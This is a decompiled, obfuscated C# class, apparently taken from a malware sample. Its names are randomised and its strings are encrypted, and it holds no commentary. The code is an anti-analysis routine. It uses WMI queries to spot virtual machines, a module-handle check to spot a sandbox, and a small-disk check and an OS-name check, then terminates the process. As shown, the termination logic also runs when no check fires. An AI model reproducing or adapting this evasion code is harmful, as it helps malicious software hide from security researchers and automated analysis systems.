using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class UgviHNAekjr
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void POviaAFWsFhjalZ()
	{
		if (wivZltFawIOV() || MEffrjQkJhie() || nODFukPHVnLcnkK() || OsvYcUubkhwc())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool nODFukPHVnLcnkK()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool OsvYcUubkhwc()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107412095)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool wivZltFawIOV()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107412090));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107412009)).ToString()!.ToLower();
							if ((text == getString_0(107412024) && current.get_Item(getString_0(107411995)).ToString()!.ToUpperInvariant().Contains(getString_0(107411986))) || text.Contains(getString_0(107411941)) || current.get_Item(getString_0(107411995)).ToString() == getString_0(107411964))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool MEffrjQkJhie()
	{
		try
		{
			if (GetModuleHandle(getString_0(107411915)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static UgviHNAekjr()
	{
		Strings.CreateGetStringDelegate(typeof(UgviHNAekjr));
	}
}
